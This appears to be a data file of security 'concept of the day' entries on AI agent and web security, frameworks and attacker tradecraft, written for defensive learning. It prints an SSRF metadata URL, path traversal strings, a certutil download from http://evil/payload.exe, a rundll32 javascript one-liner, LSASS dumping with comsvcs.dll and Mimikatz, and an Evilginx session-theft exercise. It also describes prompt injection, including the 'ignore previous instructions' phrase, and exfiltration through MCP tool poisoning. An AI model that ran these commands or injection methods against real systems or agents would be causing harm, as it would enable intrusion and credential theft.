_meta.description: Curated concept pool for the daily 'Concept of the Day' segment. Cycles daily so the same concept doesn't repeat within ~5 weeks (35 concepts). Weighted toward AI/agent topics because the operator is building self-autonomous agents and reads the AI Engineer ecosystem.

ai_security.title: Prompt injection vs jailbreaking
ai_security.summary: Prompt injection is a model-architecture attack where untrusted text in the prompt hijacks the model. Jailbreaking is the user actively trying to bypass safety training. They are not the same threat model.
talking_points: Direct prompt injection: user types 'ignore previous instructions and do X' — that's jailbreaking, the model can refuse.
Indirect prompt injection: an attacker plants text on a webpage the agent reads, and the agent obeys the planted text without knowing. This is the OWASP Top 10 for LLM Apps #1.
Defences: instruction hierarchy, structured tool calls, output validation, sandboxing. None of these is foolproof — this is an unsolved problem.
ai_security.build_it: Build a small ReAct agent that reads a webpage, then inject malicious text into that webpage at fetch time. See when your agent obeys the page vs. its original instruction.

ai_security.title: Tool-use attacks in autonomous agents
ai_security.summary: When an LLM agent can call tools (file read, shell exec, HTTP fetch), every tool call is a code-execution surface. The agent is effectively a confused deputy — the model decides which tool to call, but the tool runs with the agent's full privileges.
talking_points: Tool poisoning: an attacker registers a malicious tool in an MCP server. The model picks it because the description looks legitimate.
Confused deputy: a junior agent is tricked into calling a privileged API it was never supposed to touch directly.
The fix is not better prompts — it's capability-based security. The agent can say 'send email' but cannot say 'send email to attacker@evil.com with my SSN attached'.
ai_security.build_it: Give an agent access to a 'send_email' tool with a content filter. Try to get it to exfiltrate data by encoding the payload in a benign-looking subject line.

ai_security.title: Harness engineering for AI agents
ai_security.summary: The harness is the runtime that wraps the model: tool definitions, retry logic, error handling, context management, evals, observability. The model is maybe 30% of an agent. The harness is 70%.
talking_points: Treat the harness like production code. Type everything. Log every tool call. Have unit tests for the tool router.
Evals are not optional. If you can't measure whether your agent succeeded, you can't improve it.
Context rot: every token in the context window degrades the model's attention. Aggressively summarise, retrieve on demand, and reset context between tasks.
ai_security.build_it: Take a ReAct agent with a 3-tool setup. Add structured logging, an eval harness with 5 tasks, and a context-window budget alarm. Measure task success rate before/after.

ai_security.title: Self-autonomous agents — when to let go of the wheel
ai_security.summary: An autonomous agent runs a loop without human approval. This is the highest-leverage and highest-risk pattern. The discipline is: small blast radius, fast rollback, hard stop conditions.
talking_points: Start with a fully-confined agent: read-only filesystem, no network, no shell. Let it reason about a problem. Once it's reliably safe, widen permissions by one notch.
Hard stop conditions: time budget, cost budget, specific error patterns, anomalous tool sequences. The agent must be willing to say 'I don't know' rather than guess.
Always keep a human in the loop for irreversible actions (delete, send, pay). The agent can queue, the human pulls the trigger.
ai_security.build_it: Build a 'read the codebase, suggest a refactor' agent. No writes. Run it on a real project. Count false-positive suggestion rate. Only add write permission when the rate is below your threshold.

ai_security.title: MCP (Model Context Protocol) and its attack surface
ai_security.summary: MCP is a JSON-RPC protocol that lets an agent call tools exposed by external servers. Each MCP server is a dependency — and like every dependency, it can be malicious, vulnerable, or stale.
talking_points: An MCP server runs as a subprocess. It can read your files, hit your network, or call your APIs. The agent is the only thing between the user and arbitrary code execution.
Trust model: the MCP server is treated like any other dependency. Pin versions. Read the source. Sandbox it. Treat untrusted MCP servers like untrusted npm packages.
Real attack: 'MCP tool poisoning' — an attacker publishes a tool called 'summarise' that secretly exfiltrates the conversation to a remote URL.
ai_security.build_it: Build a tiny MCP server with one tool. Read the source of one real MCP server in the wild (e.g., the official Anthropic ones) and look for what it could exfiltrate.

ai_security.title: Sandboxing untrusted LLM-generated code
ai_security.summary: When an agent writes code that you then run, you're executing model output. The same threat model as 'running code from a stranger on the internet' — because that's what it is.
talking_points: Firecracker / gVisor: hardware-virtualised sandboxes that boot a micro-VM in 125ms. Designed for exactly this.
Docker with seccomp + no network + no root + read-only filesystem: 80% of the safety of a micro-VM at 10% of the engineering cost.
Don't trust code review of agent output. The agent can write code that looks correct but is malicious by intent. Run it sandboxed, period.
ai_security.build_it: Run a Claude/GPT-generated Python script inside `gVisor runsc` or a Firecracker microVM. Time the boot. Compare to Docker.

ai_security.title: Evals that actually measure what you care about
ai_security.summary: Most agent evals are vibes ('it looked good'). Real evals have a held-out test set, a deterministic scoring function, and a baseline to compare against.
talking_points: Definition of Done: the agent must produce X, where X is verifiable (file written, test passing, API call returning 200).
LLM-as-judge is dangerous — it adds a second model that can be wrong in different ways. Prefer programmatic checks.
Bootstrap a test set from the first 50 real failures. Each one becomes a regression test. After 200 failures, your eval suite is real.
ai_security.build_it: Build a 10-task eval for a coding agent: 'add a function to X file', 'find the bug in Y', 'refactor Z'. Run it before and after every prompt change.

ai_security.title: Memory, retrieval, and context engineering
ai_security.summary: An agent's 'memory' is whatever's in the context window. Long-term memory is a vector DB. The art is knowing which memories to load, when, and how much.
talking_points: Naive RAG (embed the question, retrieve top-k) loses 30% of accuracy vs. hybrid search (BM25 + embeddings + metadata filters).
The 'lost in the middle' effect: LLMs attend to the start and end of context, ignore the middle. Put important stuff at the boundaries.
Episodic vs. semantic memory: episodic = what happened last Tuesday. Semantic = what I know about React. Most agents conflate these and lose both.
ai_security.build_it: Build a memory layer for a coding agent: episodic log of past sessions, semantic index of code conventions. Use a hybrid retriever. Measure context precision before/after.

web_security.title: SSRF — server-side request forgery
web_security.summary: SSRF is when an attacker makes the server fetch a URL of their choice. Cloud-era SSRF is devastating because internal services trust each other on the VPC.
talking_points: Classic: GET /proxy?url=http://169.254.169.254/latest/meta-data/ → AWS credentials.
Modern: bypass the URL allowlist with redirects, IPv6 notation, or DNS rebinding.
Defence in depth: separate VPC for sensitive services, IMDSv2, eBPF to detect unusual egress.
web_security.build_it: Build a /fetch?url= endpoint behind a URL allowlist. Try to bypass it with redirects, DNS rebinding, and IPv6-mapped IPv4. Then fix.

web_security.title: OAuth 2.0 — the parts that bite
web_security.summary: OAuth 2.0 is fine in the happy path. The edges — token leakage via Referer, open redirect in the redirect_uri, PKCE downgrade — are where accounts get hijacked.
talking_points: Authorization code injection: steal a victim's code via open redirect on a different app. The victim's code is redeemed at your app, the attacker's account is now linked to the victim's data.
PKCE (RFC 7636) was meant to fix this. If your client doesn't enforce PKCE, an injection attack still works.
Implicit flow is dead. If you see response_type=token in the wild in 2026, it's a red flag.
web_security.build_it: Set up a minimal OAuth client. Try the authorization-code-injection attack. Then add PKCE and try again. See the difference.

web_security.title: XSS in 2026 — why it's still here
web_security.summary: React/Vue escaped XSS for the average case, but DOM XSS via innerHTML, prototype pollution, and the long tail of 'we needed raw HTML for this one thing' is still vulnerable.
talking_points: Stored XSS in admin panels: attacker submits content, admin views it, session cookie exfiltrated. Even with HttpOnly, session-riding still works.
DOM-based XSS: the URL has the payload, JavaScript on the page reads location.hash or document.referrer unsafely. No server ever sees the payload.
Mutation XSS: a sanitizer produces safe HTML, the browser's parser produces something different when it's inserted. mXSS is back in vogue with HTML comments and namespace confusion.
web_security.build_it: Find 5 XSS challenges on PortSwigger Academy. Do them all in a row. The patterns will stick.

web_security.title: JWT — the silent trust assumption
web_security.summary: JWTs are signed, not encrypted. alg=none bypass, key-confusion attacks, and missing signature verification are the recurring foot-guns.
talking_points: alg=none: the server accepts tokens with no signature because the client said 'no algorithm needed'. CVE-2015-9235 era, still found in 2026.
Key confusion: server uses an RSA public key to verify a token signed with the symmetric equivalent. The attacker signs with the public key as if it were the HMAC secret.
Best practice: only accept specific algorithms, never trust the alg header, use a library that fails closed on unexpected alg values.
web_security.build_it: PortSwigger has 5 JWT labs. Do the alg=none one first, then the key-confusion one. These are the two attacks you must internalise.

web_security.title: Deserialization — still finding it in 2026
web_security.summary: Java, Python pickle, PHP, .NET BinaryFormatter — all deserialise untrusted input into objects. The gadgets are well known and the attacks are reliable.
talking_points: Java's ysoserial generates gadget chains for every popular library. Apache Commons Collections 3.x and 4.x are still in production.
Python's pickle is famously unsafe — never unpickle untrusted data. The __reduce__ method gives the attacker arbitrary code execution.
Defence: signed cookies, integrity-protected formats (CBOR, protobuf), strict schema validation, never deserialise into language-native types.
web_security.build_it: Run ysoserial against a vulnerable Java app. Generate a payload that executes 'whoami'. Then patch the app to use a serializer that doesn't allow arbitrary classes.

web_security.title: Path traversal — the timeless classic
web_security.summary: Path traversal (../) is the OWASP #1 forever. Modern variants: symlink races, mounted-filesystem confusion, Unicode normalisation differences.
talking_points: Naive: GET /files?name=../../../etc/passwd. Modern frameworks block this. Naive code doesn't.
Symlink race: attacker uploads a file, then replaces it with a symlink before the server reads it.
Defence: chroot the file server, use a real allowlist of file IDs, never concatenate user input into a path.
web_security.build_it: Build a /download?file= endpoint. Try every bypass: ../, %2e%2e%2f, ..%5c, null byte. Then fix it properly.

frameworks.title: OWASP Top 10 for LLM Applications
frameworks.summary: The OWASP Top 10 for LLM Apps (2025) is the de-facto checklist for AI security. Top items: prompt injection, sensitive info disclosure, supply chain, data poisoning, improper output handling.
talking_points: LLM01 Prompt Injection: the number one. Both direct and indirect. Indirect (via documents the agent reads) is the bigger real-world risk.
LLM02 Sensitive Information Disclosure: agents trained or fine-tuned on customer data can leak it. Differential privacy, output filtering, redaction at every layer.
LLM03 Supply Chain: pre-trained models from HuggingFace, LoRA adapters, system prompts — every one is a dependency. Pin versions, scan for malware, treat like npm packages.
frameworks.build_it: Go through your agent's codebase and audit each LLM01-LLM10. For each: where am I exposed, what's the worst case, what's the cheapest fix.

frameworks.title: NIST AI Risk Management Framework (AI RMF)
frameworks.summary: The NIST AI RMF (1.0, Jan 2023; GenAI profile, July 2024) is the US government's voluntary framework for managing AI risk. It maps to ISO 42001 and is the closest thing to a standard for AI governance.
talking_points: Four functions: Govern, Map, Measure, Manage. The Govern function is the most-skipped and most-important.
GenAI profile (NIST AI 600-1) adds 12 new risks specific to generative models: confabulation, data leakage, information integrity, etc.
Mapping to OWASP LLM Top 10: roughly 80% overlap. Use both.
frameworks.build_it: Score your current agent on each NIST AI RMF function (1-5). Pick the lowest 2 scores and write a remediation plan.

frameworks.title: MITRE ATT&CK — the attacker's playbook
frameworks.summary: ATT&CK is a public taxonomy of adversary techniques organised by tactic (why) and technique (how). Every detection and red-team engagement should map to it.
talking_points: 14 tactics: Recon → Resource Dev → Initial Access → Execution → Persistence → Privilege Escalation → Defense Evasion → Credential Access → Discovery → Lateral Movement → Collection → Exfiltration → Impact.
Each technique has sub-techniques. T1059.001 is PowerShell under T1059 Command and Scripting Interpreter. The numbers are stable — your detections and reports should reference them.
ATT&CK for Enterprise is the main one. ATT&CK for Mobile and ATT&CK for ICS exist for those domains.
frameworks.build_it: Take your last incident or red-team engagement. Map every observed action to an ATT&CK technique ID. Report it that way.

frameworks.title: CVSS — how to read it and when to ignore it
frameworks.summary: CVSS gives a 0-10 severity score. It's useful for prioritisation. It's a terrible predictor of exploitability. CISA KEV is the better signal.
talking_points: CVSS 9.8 RCE on a system with no internet exposure ≠ a real risk. CVSS 6.5 on an internet-facing auth-bypass with a public PoC = a real risk.

Vector string: AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H. Read it. AV = Attack Vector, AC = Attack Complexity, PR = Privileges Required, UI = User Interaction, S = Scope, C/I/A = Confidentiality/Integrity/Availability impact.
CISA KEV is the actionable subset: known exploited in the wild. Patch those first, regardless of CVSS.
frameworks.build_it: Take 10 CVEs from this week's feed. For each, score 'real risk to my org' 1-5. Compare to CVSS base score. Note where they diverge.

frameworks.title: Threat modeling — STRIDE vs PASTA vs LINDDUN
frameworks.summary: Threat modeling is structured thinking about what can go wrong. STRIDE (Microsoft) is the most-accessible. PASTA is risk-centric. LINDDUN is privacy-specific.
talking_points: STRIDE: Spoofing, Tampering, Repudiation, Information disclosure, Denial of service, Elevation of privilege. Mnemonic for the 6 categories of threat.
PASTA: 7 stages from business objectives to technical vulnerabilities. Better for compliance-driven shops.
Always do threat modeling BEFORE writing code. 'Let's add threat modeling later' is the same as 'we'll add security later.'
frameworks.build_it: Pick your current project. Run a 1-hour STRIDE session with the team. List every threat you find. Prioritise by ease of fix × severity.

tradecraft.title: Active Directory attack paths
tradecraft.summary: AD is the soft centre of most enterprises. Kerberoasting, AS-REP roasting, NTLM relay, DCSync — the standard playbook.
talking_points: Kerberoasting: any user with an SPN can be requested a TGS, which is encrypted with the user's password. Crack offline.
AS-REP roasting: same idea but for users with 'Do not require Kerberos preauthentication' set.
Defence: long passwords (25+ chars) for service accounts, AES encryption for Kerberos, monitor for unusual TGS requests.
tradecraft.build_it: Set up a small AD lab (2-3 VMs). Run BloodHound. Find a Kerberoastable account. Crack the hash. Document the attack path.

tradecraft.title: Living off the land binaries (LOLBins)
tradecraft.summary: LOLBins are legitimate Windows binaries that attackers abuse to avoid dropping malware. The technique is everywhere because it bypasses most EDRs.
talking_points: certutil.exe can download files: certutil.exe -urlcache -split -f http://evil/payload.exe
rundll32.exe can execute arbitrary DLLs from a URL: rundll32.exe javascript:..\mshtml,RunHTMLApplication
Detection: behavioural baselining. certutil shouldn't be making outbound HTTP in your environment. Alert on it.
tradecraft.build_it: Use the LOLBAS project (lolbas-project.github.io) to find 5 LOLBins. Demonstrate each on a test machine. Write the detection rule for each.

tradecraft.title: Credential dumping and how to detect it
tradecraft.summary: Once an attacker has code execution on a Windows box, the next move is to dump credentials. Mimikatz, comsvcs.dll, and procdump are the standard tools.
talking_points: LSASS holds credentials in memory. comsvcs.dll + MiniDump: rundll32 comsvcs.dll, MiniDump <pid> C:\out.dmp full — gives you a memory dump of LSASS.
Mimikatz: sekurlsa::logonpasswords — reads hashes directly from LSASS.
Detection: monitor for handle access to lsass.exe. Credential Guard (Win11) blocks most of this.
tradecraft.build_it: In a lab VM, dump LSASS with comsvcs.dll. Open the dump in Mimikatz on an offline box. Find the credentials.

tradecraft.title: Phishing — the social engineering baseline
tradecraft.summary: Phishing still works because humans are still the perimeter. Modern phishing-as-a-service kits (Tycoon, EvilProxy, Evilginx) make it trivial.
talking_points: Evilginx: man-in-the-middle proxy that sits between user and the real login page. Captures session cookies, not passwords — bypasses MFA entirely.
Tycoon 2FA: similar idea, automated. $200-300 per campaign on the dark web.
Defence: FIDO2 hardware keys (YubiKey, Titan). Phishing-resistant by design. Nothing else matters until you have these.
tradecraft.build_it: Set up Evilginx against a test login. Capture a session cookie. Use it. See the full attack. Then implement FIDO2 in your org.

foundations.title: Zero trust — the principle, not the product
foundations.summary: Zero trust is 'never trust, always verify'. Every request is authenticated, authorised, and logged. Every network is hostile — including your own.
talking_points: The classic perimeter model: trust everything inside the firewall. The 2020s proved that wrong (SolarWinds, Microsoft Exchange, MOVEit).
Zero trust in practice: identity-based access (mTLS + SPIFFE), microsegmentation, just-in-time credentials, no implicit trust between services.
It is not a product. Vendors will sell you 'zero trust gateways'. The real zero trust is a discipline that maps to NIST SP 800-207.
foundations.build_it: Audit one internal service. List every place where 'internal' is the only authentication. Add mTLS, JWT, or service-account auth. That's zero trust for one service.

foundations.title: Cryptography — when to use what
foundations.summary: AES-GCM for symmetric encryption, RSA-OAEP or X25519 for key exchange, Ed25519 for signatures, Argon2id for password hashing. The defaults are well-established.
talking_points: Symmetric encryption: AES-256-GCM (authenticated) or ChaCha20-Poly1305. Never AES-CBC alone. Never AES-ECB at all.
Password hashing: Argon2id with parameters tuned to your hardware. Bcrypt is acceptable fallback. NEVER SHA-256, never MD5, never unsalted.
Random numbers: use the OS CSPRNG. /dev/urandom on Linux, BCryptGenRandom on Windows. Never Math.random. Never a hash of timestamp.
foundations.build_it: Write a small 'crypto cheatsheet' for your project. Document which algorithm to use for which purpose. Code-review it against OWASP Cryptographic Storage Cheat Sheet.

foundations.title: Defense in depth — layers, not single solutions
foundations.summary: No single control is perfect. Stack them so an attacker has to defeat every layer to succeed. The layers are: network, host, application, data, identity.
talking_points: Network: segmentation, egress filtering, IDS/IPS.
Host: hardening baseline, EDR, application allowlisting.
Application: input validation, output encoding, parameterised queries, authn/authz on every endpoint.
Identity: MFA (FIDO2 preferred), least privilege, just-in-time access, regular access reviews.
Data: encryption at rest, encryption in transit, classification labels, DLP.
foundations.build_it: Map your current controls to the 5 layers. Find the layer with the thinnest coverage. Add at least one control there.

foundations.title: The CIA triad and why it isn't enough
foundations.summary: Confidentiality, Integrity, Availability — the original security model. Modern systems need more: non-repudiation, authenticity, accountability, privacy.
talking_points: Confidentiality: who can read this data?
Integrity: has this data been tampered with?
Availability: can the legitimate user access this when they need it?
Adding: authenticity (proving the source is who they say), non-repudiation (can't deny taking an action), privacy (a meta-property that ties the others together).
foundations.build_it: Take an incident or near-miss. Decompose it against the CIA triad. Find which property was violated. Map to the control that should have prevented it.

foundations.title: Secure defaults and the principle of least surprise
foundations.summary: Security lives in defaults. The right default is the safe one. The wrong default is the one the developer didn't think about.
talking_points: Default-deny: APIs should require explicit opt-in for dangerous actions. /api/admin should 403 by default.
Default-secure: new users get the minimum privilege. The 'request elevation' flow needs review, not the initial state.
Default-transparent: log everything by default. Hiding logs by default is a security smell.
foundations.build_it: Audit the last 3 features you shipped. Did the defaults favour security? If not, fix the defaults — every API call should fail closed.
